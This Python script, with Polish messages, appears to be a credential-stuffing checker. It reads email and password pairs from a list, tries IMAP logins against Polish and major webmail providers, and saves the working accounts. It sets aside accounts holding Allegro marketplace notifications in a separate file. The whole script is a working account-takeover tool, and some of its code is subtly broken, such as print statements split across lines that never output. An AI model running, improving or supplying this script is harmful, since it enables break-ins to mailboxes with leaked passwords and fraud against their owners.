#!/usr/bin/python3.5

import imaplib
import configparser
import os
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("input")
parser.add_argument("output")
args = parser.parse_args()

aliasy = ['interia.pl', 'poczta.fm', 'interia.eu', 'wp.pl', 'tlen.pl', 'go2.pl', 'o2.pl', 'home.pl', 'outlook.com',
          'yahoo.com', 'yahoo.pl', 'poczta.pl', 'neostrada.pl']
imap = ['poczta.interia.pl', 'poczta.interia.pl', 'poczta.interia.pl', 'imap.wp.pl', 'poczta.o2.pl', 'poczta.o2.pl',
        'poczta.o2.pl', 'post.pl', 'imap-mail.outlook.com', 'imap.mail.yahoo.com', 'imap.mail.yahoo.com',
        'imap.poczta.pl', 'poczta.neostrada.pl']
port = ['993', '993', '993', '993', '993', '993', '993', '143', '993', '993', '993', '993', '143']


def connection(ima, por, log, pas):
    server = imaplib.IMAP4_SSL(ima, por)
    server.login(log, pas)
    rv, data = server.select("INBOX")
    if rv != "OK":
        print
        "brak folderu inbox"
    rv, data = server.search(None, '(FROM "powiadomienia@allegro.pl")')
    if rv == "OK":
        if data != "":
            ztagiem.append(mail + ":" + passw)
    return connection


with open(args.input) as infile:
    mail = ""
    passw = ""
    dobre = []
    ztagiem = []
    data2 = infile.read()
    mlist2 = data2.splitlines()
    licz = 0
    udane = 0
    for line in mlist2:
        if (line.split(",")[0] == "end!!!"):
            break
        else:
            mail = line.split(",")[0]
            passw = line.split(",")[1]
            if "@" in mail:
                if mail.split("@")[1] in aliasy:
                    temp3 = aliasy.index(mail.split("@")[1])

                    print
                    "proba logowania do " + imap[temp3] + "   " + mail + ":" + passw + "   udanych   " + str(
                        udane) + "/" + str(licz)
                    try:
                        connection(imap[temp3], port[temp3], mail, passw)
                        print
                        "udane"

                        dobre.append(mail + ":" + passw)
                        udane += 1

                    except imaplib.IMAP4.error:
                        print
                        "niestety nie udane (najprawdopodobniej zle haslo)"
                    except KeyboardInterrupt:
                        print
                        "przerwane przez usera"
                        break
                    except:
                        print
                        "niestety nie udane (blad ssl)"

                    licz += 1

                else:
                    licz += 1


            else:
                licz += 1
                continue
    print
    dobre
    f = open(args.output, 'w')
    f.write("\n".join(dobre))
    s = open("czesz.txt", 'w')
    s.write("\n".join(ztagiem))